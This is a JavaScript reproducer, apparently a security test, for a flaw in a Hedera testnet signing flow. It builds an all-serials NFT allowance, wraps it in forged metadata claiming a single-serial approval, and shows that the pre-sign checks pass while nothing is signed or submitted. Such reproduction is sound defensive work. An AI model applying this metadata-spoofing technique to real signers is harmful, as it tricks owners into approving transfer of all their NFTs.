import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import {
  AccountAllowanceApproveTransaction,
  AccountId,
  Client,
  Transaction,
  TransactionId,
} from "@hiero-ledger/sdk";

const ownerAccountId = "0.0.8504405";
const spenderAccountId = "0.0.8504300";
const tokenId = "0.0.8505698";
const claimedSerial = 193;

const client = Client.forTestnet();
try {
  // Build a deliberately widened allowance: all NFT serials for the same token,
  // owner and spender. No signing or network submission occurs in this test.
  const widened = new AccountAllowanceApproveTransaction()
    .approveTokenNftAllowanceAllSerials(tokenId, ownerAccountId, spenderAccountId)
    .setTransactionId(TransactionId.generate(AccountId.fromString(ownerAccountId)))
    .freezeWith(client);

  const widenedBytes = widened.toBytes();
  const widenedTx = Transaction.fromBytes(widenedBytes);
  assert.ok(widenedTx instanceof AccountAllowanceApproveTransaction);
  assert.equal(widenedTx.tokenNftApprovals.length, 1);

  const decodedAllowance = widenedTx.tokenNftApprovals[0];
  assert.equal(decodedAllowance.tokenId.toString(), tokenId);
  assert.equal(decodedAllowance.ownerAccountId?.toString(), ownerAccountId);
  assert.equal(decodedAllowance.spenderAccountId?.toString(), spenderAccountId);
  assert.equal(decodedAllowance.allSerials, true);
  assert.equal(decodedAllowance.serialNumbers, null);

  // Forge only the JSON metadata around those bytes so it claims the exact
  // property the H1 artifact says it proves. The transaction ID/payer remain
  // internally consistent with the widened bytes.
  const proofEnvelope = {
    network: "testnet",
    preparedBy: "HAK AgentMode.RETURN_BYTES",
    secretAvailableToPreparer: false,
    action: "approve_serial",
    authority: {
      tokenId,
      serial: claimedSerial,
      ownerAccountId,
      spenderAccountId,
      scope: "single_serial",
      approvedForAll: false,
    },
    envelope: {
      bytesBase64: Buffer.from(widenedBytes).toString("base64"),
      transactionId: widenedTx.transactionId?.toString(),
      payerAccountId: ownerAccountId,
      mode: "RETURN_BYTES",
      signed: false,
      submitted: false,
    },
  };

  // These are the semantic assertions made by the current external-signer
  // boundary before it signs. They all pass even though the decoded allowance
  // is approved-for-all rather than the claimed single serial.
  const signerAccountId = ownerAccountId;
  assert.equal(proofEnvelope.network, "testnet");
  assert.equal(proofEnvelope.preparedBy, "HAK AgentMode.RETURN_BYTES");
  assert.equal(proofEnvelope.secretAvailableToPreparer, false);
  assert.equal(proofEnvelope.envelope.mode, "RETURN_BYTES");
  assert.equal(proofEnvelope.envelope.signed, false);
  assert.equal(proofEnvelope.envelope.submitted, false);
  assert.equal(proofEnvelope.envelope.payerAccountId, signerAccountId);

  const decodedAtSigner = Transaction.fromBytes(
    Buffer.from(proofEnvelope.envelope.bytesBase64, "base64")
  );
  assert.equal(
    decodedAtSigner.transactionId?.toString(),
    proofEnvelope.envelope.transactionId
  );
  assert.equal(decodedAtSigner.transactionId?.accountId?.toString(), signerAccountId);

  // Anchor the reproducer to the exact current production validation surface:
  // neither H1 preparer nor external signer inspects decoded NFT allowance
  // semantics before writing/signing the evidence envelope.
  const preparerSource = readFileSync(
    "scripts/hedera-delegated-recovery-return-bytes-live.mjs",
    "utf8"
  );
  const signerSource = readFileSync(
    "scripts/hedera-return-bytes-external-signer.mjs",
    "utf8"
  );
  for (const source of [preparerSource, signerSource]) {
    assert.equal(source.includes("tokenNftApprovals"), false);
    assert.equal(source.includes("allSerials"), false);
    assert.equal(source.includes("serialNumbers"), false);
  }

  console.log(
    JSON.stringify(
      {
        reproduced: true,
        target: "H1 RETURN_BYTES proof boundary",
        claimed: {
          scope: proofEnvelope.authority.scope,
          serial: proofEnvelope.authority.serial,
          approvedForAll: proofEnvelope.authority.approvedForAll,
        },
        decoded: {
          tokenId: decodedAllowance.tokenId.toString(),
          ownerAccountId: decodedAllowance.ownerAccountId?.toString(),
          spenderAccountId: decodedAllowance.spenderAccountId?.toString(),
          allSerials: decodedAllowance.allSerials,
          serialNumbers: decodedAllowance.serialNumbers,
        },
        currentPreSignValidationPassed: true,
        networkSubmissionPerformed: false,
      },
      null,
      2
    )
  );
} finally {
  client.close();
}
